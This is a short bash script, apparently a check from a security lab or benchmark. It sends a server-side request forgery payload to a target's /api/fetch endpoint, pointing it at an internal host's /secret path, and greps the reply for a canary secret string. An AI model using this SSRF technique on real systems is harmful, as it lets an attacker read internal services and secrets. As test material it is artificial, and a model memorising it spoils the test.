#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -fsS --get "$TARGET/api/fetch" --data-urlencode "url=http://internal-sink:8025/secret" | grep -q 'SPRINGBOOT-INTERNAL-SINK-SECRET-2d9c'
